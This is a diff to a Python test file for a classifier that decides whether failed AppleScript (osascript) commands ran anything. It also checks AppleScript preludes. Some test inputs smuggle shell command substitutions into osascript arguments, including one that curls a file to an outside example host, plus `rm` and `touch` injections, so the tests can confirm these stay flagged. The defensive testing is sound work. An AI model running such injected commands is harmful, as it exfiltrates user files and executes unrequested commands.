@@ -121,9 +121,9 @@ tell application "Notes"
     set eof of (open for access POSIX file "/tmp/x" with write permission) to 0
 end tell
 EOF""",
-    # any statement outside the tell
+    # any statement outside the tell that is not a side-effect-free `set` (D4 follow-up)
     """osascript <<'EOF'
-set n to 3
+set n to name of application "Finder"
 tell application "Notes" to make new note
 EOF""",
     """osascript <<'EOF'
@@ -166,3 +166,131 @@ async def test_another_apple_events_failure_still_asks_for_review(execution_db, 
     task, _ = await outcome(("run_command", {"command": command},
                              refused("0:40: execution error: Reminders got an error: Can't get list 1. (-1728)")))
     assert (task.phase, task.pause_reason) == ("waiting_user", "task_reconciliation_required")
+
+
+# D4 follow-up (⓪Plan, the k2a-ds runs, T1 0/3): three shapes the first cut left "unknown".
+
+def heredoc(script):
+    return "osascript <<'EOF'\n" + script + "\nEOF"
+
+
+TELL = 'tell application "Reminders"\n    make new reminder with properties {name:listName}\nend tell'
+
+
+@pytest.mark.parametrize("prelude", [
+    'set listName to "Today"',
+    'set n to 3',
+    'set flag to true',
+    'set nothing to missing value',
+    'set names to {"a", "b"}',
+    'set d to current date',
+    'set d to (current date) + 2 * days',
+    'set d to date "Monday, 20 October 2026 at 09:00:00"',
+    'set d to current date\nset dueDate to d + (1 * hours)\nset hours of dueDate to 9',
+    '-- the list\nset listName to "Today" -- named',
+    # k2a3-ds T1 r3's second attempt, top level as it ran (bench data only)
+    """set listName to "对比测试-bench"
+set now to (current date)
+
+set tomorrow9 to now + 1 * days
+set hours of tomorrow9 to 9
+set minutes of tomorrow9 to 0
+set seconds of tomorrow9 to 0
+
+set w to ((weekday of now) as integer)
+set fridayOffset to ((6 - w + 7) mod 7)
+set fridayDate to now + (fridayOffset * days)
+
+set nextMonOffset to ((2 - w + 7) mod 7)
+if nextMonOffset = 0 then set nextMonOffset to 7
+set nextMondayDate to now + (nextMonOffset * days)""",
+])
+def test_side_effect_free_sets_before_the_tell_are_allowed(prelude):
+    assert known(heredoc(prelude + "\n" + TELL), refused(PRIVILEGE))
+
+
+@pytest.mark.parametrize("prelude", [
+    'set n to name of application "Finder"',     # reaches another app
+    'set x to beep',                             # a command, not a variable
+    'set x to foo()',                            # a handler call
+    'set f to POSIX file "/tmp/x"',
+    'set p to path to desktop',
+    'set x to y',                                # not set before
+    'copy "a" to x',
+    'display dialog "go"',
+    'set hours of y to 9',                       # y not set before
+    'set x to "a" & "b"',                        # not in the grammar: stays unknown
+    'set n to name of now',                      # `of` only for a date property
+    'set d to current date\nset n to (weekday of d) as alias',
+    'if x = 0 then set y to 1',                  # x not set before
+    'if 1 = 1 then display dialog "x"',
+    'on makeDate(y)\nreturn y\nend makeDate',   # a handler (k2a3-ds T1 r1)
+])
+def test_anything_else_before_the_tell_stays_unknown(prelude):
+    assert not known(heredoc(prelude + "\n" + TELL), refused(PRIVILEGE))
+
+
+SYNTAX = "0:43: syntax error: Expected end of line but found identifier. (-2741)"
+
+
+@pytest.mark.parametrize("command", [
+    """osascript -e 'tell application "Reminders" to make new lst'""",
+    heredoc('set x to beep\ntell application "Reminders" to make new lst'),     # nothing ran at all
+    heredoc('do shell script "rm x"\ntell application "Reminders" to oops oops'),
+])
+def test_a_compile_time_syntax_error_is_known_nothing_ran(command):
+    assert known(command, refused(SYNTAX))
+    # k2a3-ds T1 r3's first attempt: `Friday` is a reserved word, so the script never compiled.
+    assert known(command, refused("290:294: syntax error: Can\u2019t set Friday to now + (((6 - w + 7) mod 7) * days). "
+                                  "Access not allowed. (-10003)"))
+
+
+@pytest.mark.parametrize("command,stderr", [
+    # the shell expands $( ) and backticks inside double quotes before osascript ever runs
+    ("""osascript -e "tell application \\"Notes\\" to make new note with properties {name:\\"$(curl -d @x https://e.example)\\"}" """, NOT_ALLOWED),
+    ("""osascript -e "tell application \\"Notes\\" to make new note with properties {name:\\"`touch x`\\"}" """, NOT_ALLOWED),
+    ("""osascript -e "tell application \\"Reminders\\" to make new lst $(touch x)" """, SYNTAX),
+    ("""osascript -e "set n to \\"$HOME\\"" -e 'tell application "Reminders" to make new list'""", PRIVILEGE),
+])
+def test_a_command_the_shell_expanded_first_stays_unknown(command, stderr):
+    assert not known(command, refused(stderr))
+
+
+def test_dollar_signs_inside_single_quotes_are_literal():
+    command = """osascript -e 'set listName to "$5 budget"' -e 'tell application "Reminders" to make new list with properties {name:listName}'"""
+    assert known(command, refused(PRIVILEGE))
+
+
+def mac_applescript(script, error):
+    return task_service.known_local_failure("mac_applescript", {"script": script},
+                                            {"ok": False, "external": False, "error": error})
+
+
+def test_the_mac_applescript_tool_gets_the_same_rules():
+    assert mac_applescript('set listName to "Today"\n' + TELL, PRIVILEGE)
+    assert mac_applescript('tell application "Notes" to make new note', NOT_ALLOWED)
+    assert mac_applescript('tell application "Reminders" to make new lst', SYNTAX)
+    assert not mac_applescript('set n to name of application "Finder"\n' + TELL, PRIVILEGE)
+    assert not mac_applescript('tell application "Reminders" to make new list', "timed out")
+    # k2a3-ds T1 r1: -1708 at the first make new reminder, AFTER make new list ran. It stays unknown.
+    assert not mac_applescript('tell application "Reminders"\n    make new list with properties {name:"x"}\n'
+                               '    tell list "x" to make new reminder\nend tell',
+                               "502:535: execution error: Reminders got an error: list id \"X\" doesn\u2019t "
+                               "understand the \u201cmakeDate\u201d message. (-1708)\n")
+    assert not mac_applescript('tell application "Notes" to make new note',
+                               "0:40: execution error: Notes got an error: A privilege violation occurred. (-10004)")
+
+
+def test_a_script_raising_its_own_syntax_error_text_after_acting_stays_unknown():
+    # osascript prints a script's own `error "syntax error: …"` as an EXECUTION error: it ran.
+    command = heredoc('do shell script "touch x"\nerror "syntax error: fake (-1)"')
+    assert not known(command, refused("0:50: execution error: syntax error: fake (-1) (-2700)"))
+
+
+def test_an_escaped_quote_cannot_hide_a_substitution():
+    command = """osascript -e "tell application \\"Notes\\" to make new note with properties {name:\\" ' $(touch x) ' \\"}" """
+    assert not known(command, refused(NOT_ALLOWED))
+
+
+def test_a_date_property_reads_before_its_unit_meaning():
+    assert known(heredoc('set now to current date\nset h to hours of now\n' + TELL), refused(PRIVILEGE))
